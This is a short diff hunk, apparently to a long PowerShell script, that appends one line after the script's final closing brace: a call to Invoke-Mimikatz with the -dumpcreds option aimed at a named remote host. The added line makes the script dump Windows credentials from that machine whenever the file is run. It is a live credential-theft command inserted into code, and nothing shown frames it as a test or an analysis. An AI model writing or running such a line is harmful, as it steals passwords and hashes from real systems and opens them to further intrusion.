@@ -2749,3 +2749,4 @@ Function Main
 
 Main
 }
+Invoke-Mimikatz -dumpcreds -computername fsc-web-01
